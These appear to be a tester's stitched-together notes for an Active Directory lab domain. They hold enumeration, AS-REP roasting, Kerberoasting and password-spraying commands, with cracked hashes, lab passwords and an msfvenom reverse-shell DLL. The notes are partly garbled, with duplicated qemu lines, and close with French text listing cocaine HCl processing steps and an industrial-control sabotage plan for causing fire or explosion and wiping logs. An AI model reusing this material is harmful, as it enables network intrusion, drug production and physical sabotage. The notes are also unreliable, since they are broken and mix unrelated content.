# Pentest AD

**env**

```bash
export DOMAIN=north.sevenkingdoms.local
export USER=brandon.stark
export PASSWORD=imbeautiful
export DC_IP=10.24.38.167
export LOCAL_IP=10.42.42.102
export LOCAL_PORT=9991


export USER=jon.snow
```

**/etc/host**

```bash
10.11.52.142   sevenkingdoms.local kingslanding.sevenkingdoms.local     kingslanding
10.24.38.167   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell 
10.68.27.136   essos.local meereen.essos.local meereen
10.170.24.2   castelblack.north.sevenkingdoms.local castelblack
10.170.24.3   braavos.essos.local braavos
```

## Enum shares

```bash
nxc smb 10.11.52.142 --shares
nxc smb 10.24.38.167 --shares
nxc smb 10.68.27.136 --shares
nxc smb 10.170.24.2  --shares
nxc smb 10.170.24.3  --shares
```

## As-req

```bash
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile user.txt
hashcat -m 18200 hash-req.txt /usr/share/wordlists/rockyou.txt 
```tar tar -xvf appliance.ovatar -xvf appliance.ovatar -xvf appliance.ova


qemu-img -h | tail -n1qemu-img -h | tail -n1qemu-img convert -O qcow2 input.vmdk output.qcow2

## Enum     users

```bash 
apt-get install qemu-utilsapt-get install qemu-utils    apt-get install qemu-utils
```

```
sansa.stark
brandon.stark
rickon.stark
hodor
jon.snow
samwell.tarly
jeor.mormont
sql_svc
SMB
```

```bash
mkdir LDAP && neo4j start& && rusthound -d "$DOMAIN" -u "$USER"@"$DOMAIN" -p "$PASSWORD" --zip --ldaps --adcs --old-bloodhound && unzip *.zip && bloodhound-import -du neo4j -dp exegol4thewin *.json && bloodhound &> /dev/null &
```

```bash
nxc ldap 10.24.38.167 -u user.txt -p user.txt
nxc smb 10.24.38.167 -u user.txt -p user.txt
```

Résultat

```
nxc ldap 10.24.38.167 -u 'samwell.tarly' -p 'Orgrimmar' 
nxc ldap 10.24.38.167 -u 'hodor' -p 'hodor'
```

## Password Policy  

```bash
Get-GPPPassword.py "$USER@$DC_IP" -dc-ip "$DC_IP" -hashes $NT_HASH
```

## Kerberoasting

```bash
GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "10.24.38.167" "$DOMAIN"/"$USER":"$PASSWORD"
hashcat -m 13100 --force -a 0 Kerberoastables.txt /usr/share/wordlists/rockyou.txt --force 
```

```bash
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:aab1cdbad962fced21fb0bae94079e41$6a03da65f68cb1f574ea89621bce803bbb5fe4fb90d440a13c95d1e2f4b02d3d7e783662755c73912403df596a0887fc107d689a274762ef2be47ac3aa94dc725ebba93e4c31a7f84671e929e0dca42df548275ee927ea759ca2006a5b4a9674931013fb44621ca09dc6602cb12b2a2dc275698b762d4ee9f9651f21975195e7b3eaa89861f6c9c6ab5cd79f5402884e4e51c9f64f7219d0cdea96fdf8486a7ecd56f14c71175aa0d46c8cf3ee3c0e0f44addd390a561c5edca10e5f02703a1b5a71d85dfb51c2f7827732526ddb2bbbc72f0eec7142ead5d9a7fc4ebddbffd5b28784387245c0374c66009a7ab36c0ba71c74adc3b9eebde2aa2a5dfed0293eedab865ad
[...]:imbeautiful
```

```bash
$krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow*$009a9a500d7b2be9f6d5c4ddb4a5acf7$9a9f91816f96f0b35bfc3c86db8df877d8e3cc617b2e38c1d4cae7dbfdc95d8d47f378e032a7efb2035c694f8ff414c3491214c0b15fe9d5c9bc81c28aba0c15dbfd46b1ba8b18d6076b5624a8cbb5561cf5ee25dec6c30a77212181d3b5b78b93e72017969e9c1025f4ba11cb71dc5d38c14c507bc3cd113f1654b2443b1cd048a89d63aeae42370f2748e9707b92358464e48bc49973b16939ce7dec8bf954f060fe16cf102082a87125ca424ea6fd80aeea8db71d1edabb3d486f9534ca681635518a3651d22b9d4bd3601f5ac5f19d4319a99e58ffe329f1f0752e8ace820a6b33e9c1814dbe6f89e4aa726e0d5a113b0482f1edfc632b2e220f9b14873a87ee3424e3ae934e48f5ef813188753de48620947df21e513d5d6ed0c5f6fb05d511537dfd272a1bb383f5212e08d6f3dc917c57ceeb8a57c2a961373f890b4b1be6f7c3a3bf6a01644fccc263de4a42007dc9258f50b5481a136091ce7dffc8d91607726ead80a1518bd4285122b57338ed8fcb515ef6f8fb8d05d95c1ba773b7f0ab04e46e1ec7b27afc5b790e4f1d0e374f219e84d49d3f5de49591f937fbeccf7b9c09c2ea87d466db1081eb5b85b59a56c74001cd80506eeee070584c9967f02e66424f40e9c8132d35a22df1291f7c9e7c8aa5e3354a9a8fb4a0e65ca29bb353dfed7fa81a966ab02bd809ca1217ea990b79451eec181ec0c243c6964cdf28dfe6953781dce69417ae0bfa2a3c9e4be59700394ce6c9f522a5a6f144e00c034810a3b59d7d8dfab6c3cdfe2fe1979e8ecb69f39943c396f8b4e39d433611566454a8d200a3d081cc89e68b24357a9e0104605f43c9fdb151e770551d1ca9937dd2ea3f4dcd4673e0147897c4856d293691584b30b16e403d92201fd1942f636b6ec28b30cea7bb86f32139dc7b32bf370d654312d7f175bb881b8a6e764fcdfc1195e3b72884a059c8a22544318c545c236c61db7f3c6ea4a4e261b0489e70b0f2947cc4d72860880a6bc71429e3cabf4da78b54983e02990b8ffd47e148e69516493255734c51e4913dc6557e3bf61763aeeee017c8dfb1e4a4c6a9e5c6a89385e6cb1ba6b8e8c7690e838e4f3b0d7c62445e3e7355b9937d79cc258088b697e673ec5665938af10eb6e979f9b68e7320e771455be4301e8fa08a9167d377cb707f2ef30ea01649fc0af0bce72a5ab96f94202abca082780e3f401f5ceee0729e55f16dd4962844528a89d0508912b1b0d7b787b2ae32d7a7860845d490f69ac8fe0b3efdfe5705591653e5c26d08f91d063d2fc2f42251d16e207e119bc53d3b63111e43ed8e6c32a3c4cd7359c92fdc304b847a86d19c68499e488e398db675eab2f2b6e1735f5fc75ac0cba18c5e6c08732223817e1c38c11ec3d3f80b4a2066fd6d4b880e47289487c7ad1263d19e0b2144c5f690a318ea37633dd4589911c3d9c2fff45ac1d64285a7:whatdoyouwant
[...]:whatdoyouwant
```



## Spooler


```
10.24.38.167
10.170.24.3
10.170.24.2
```

```
exegol-pentest /workspace # nxc smb DC-IP.txt -u $USER -p $PASSWORD -M spooler 
SMB         10.11.52.142    445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.24.38.167    445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.170.24.2     445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         10.170.24.3     445    BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         10.68.27.136    445    MEEREEN          [*] Windows 10 / Server 2016 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         10.24.38.167    445    WINTERFELL       [+] north.sevenkingdoms.local\brandon.stark:imbeautiful 
SMB         10.11.52.142    445    KINGSLANDING     [-] sevenkingdoms.local\brandon.stark:imbeautiful STATUS_LOGON_FAILURE
SMB         10.170.24.2     445    CASTELBLACK      [+] north.sevenkingdoms.local\brandon.stark:imbeautiful 
SMB         10.170.24.3     445    BRAAVOS          [+] essos.local\brandon.stark:imbeautiful (Guest)
SMB         10.68.27.136    445    MEEREEN          [-] essos.local\brandon.stark:imbeautiful STATUS_LOGON_FAILURE 
SPOOLER     10.24.38.167    445    WINTERFELL       Spooler service enabled
SPOOLER     10.170.24.3     445    BRAAVOS          Spooler service enabled
SPOOLER     10.170.24.2     445    CASTELBLACK      Spooler service enabled
Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```


rpcdump.py @10.24.38.167 | egrep 'MS-RPRN|MS-PAR'
rpcdump.py @10.170.24.3 | egrep 'MS-RPRN|MS-PAR'
rpcdump.py @10.170.24.2 | egrep 'MS-RPRN|MS-PAR'

export DOMAIN=north.sevenkingdoms.local
export USER=brandon.stark
export PASSWORD=imbeautiful
export DC_IP=10.24.38.167
export LOCAL_IP=10.42.42.102
export LOCAL_PORT=9991

msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -o /workspace/smb/remote.dll


Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 

cat HTTP/alive-inscope.txt | sed 's/:[0-9]\+$//' | awk -F. '{if (NF >= 2) {print $(NF-1) "." $NF} else {print $0}}' | sort -u | jq -R -s 'split("\n") | map(select(length > 0)) | {flags: "-iE", patterns: .}' | tee $HOME/.gf/scope-dns.json

cat crawl-tmp.txt | grep "\.js" | sort -u | tee alljs.txt
cat crawl-tmp.txt | grep "\[javascript\]" | sort -u | awk -F " - " '{print $2}' | anew URL/alljs-url.txt
cat crawl-tmp.txt | grep "\[href\]" | sort -u | awk -F ' - ' '{print $2}' | anew URL/link.txt
cat crawl-tmp.txt | grep "\[href\] \- javascript"| sort -u | awk -F ' - ' '{print $2}' | anew URL/all-inlinejs.txt
cat crawl-tmp.txt | grep "\[form\]"| sort -u | awk -F ' - ' '{print $2}' | uro | anew URL/form.txt
cat crawl-tmp.txt | grep "\[upload-form\]"| sort -u | awk -F ' - ' '{print $2}' | uro | anew URL/upload-form.txt
cat crawl-tmp.txt | grep "\[url\]"| sort -u | awk -F ' - ' '{print $2}' | anew URL/url.txt
cat crawl-tmp.txt | grep "\[aws-s3\]"| sort -u | awk -F ' - ' '{print $2}' | anew URL/aws-s3.txt
cat crawl-tmp.txt | grep "\[linkfinder\]"| sort -u | awk -F ' - ' '{print $2}' | anew URL/linkfinder.txt
cat crawl-tmp.txt | grep "\[robots\]"| sort -u | awk -F ' - ' '{print $2}' | anew URL/robots.txt
cat crawl-tmp.txt | grep "\[subdomains\]"| sort -u | awk -F ' - ' '{print $2}' | anew URL/subdomains.txt

find . -type f -size 0 -name "*.txt" -delete

 -> Dissolution avec éther ou acétone -> Précipitation avec acide chlorhydrique -> Séchage sous lampe / micro-ondes -> Conditionnement

Automate conditionnel / Temporisé : 
- Chaque phase dépend du résultat de la précédente
- Pour gérer les temps de réaction (ex : 6 heures de repos).


🎭 Scénario d’attaque OT : “Opération Ghost Solvent”

🎯 Objectif de l’attaquant

Saboter ou détourner le processus de cristallisation de la cocaïne HCl pour :
	• Générer un produit de mauvaise qualité
	• Provoquer une explosion ou incendie (produits inflammables : éther, acétone)
	• Exfiltration d’information sur la localisation de la production

⸻

🧱 Infrastructure cible
	• PLC (Automates programmables) contrôlant les réacteurs chimiques, temps de séchage, dosage d’acide HCl.
	• Réseau Modbus TCP/IP ou Ethernet/IP
	• SCADA (interface de supervision des processus de transformation)
	• Capteurs de température, pression, pH
	• Actionneurs : pompes, valves, résistances chauffantes

⸻

🔓 Vecteur d’entrée utilisé
	• Accès distant mal protégé (TeamViewer, VNC, ou port RDP ouvert)
	• Ou clé USB compromise insérée par un opérateur inconscient (attaque air-gap)
	• Ou exploit CVE sur le firmware du PLC (ex: Rockwell, Siemens, etc.)

⸻

🧨 Étapes de l’attaque
	1. Reconnaissance réseau : L’attaquant scanne les adresses IP internes, découvre les automates (ex: Siemens S7-1200).
	2. Accès au SCADA via login faible ou volé.
	3. Injection de commandes Modbus : il change les consignes de température du séchage ou les durées de réaction acide/base.
	4. Sabotage :
        • Il augmente la température à 90°C alors qu’elle doit rester à 40°C.
        • Il déclenche simultanément plusieurs actionneurs (pompes, soupapes), provoquant un débordement.
        • Il stoppe les ventilateurs de séchage, favorisant l’accumulation de vapeurs inflammables.
	5. Nettoyage/log wiping : suppression des logs du SCADA (ou injection de logs falsifiés).
	6. Optionnel : Exfiltration des recettes de transformation ou localisation GPS du labo.


nmap -p 26101,8080,9197,7678 192.168.68.68
nmap -p 8080 192.168.68.68
nmap -p 9197 192.168.68.68
nmap -p 7678 192.168.68.68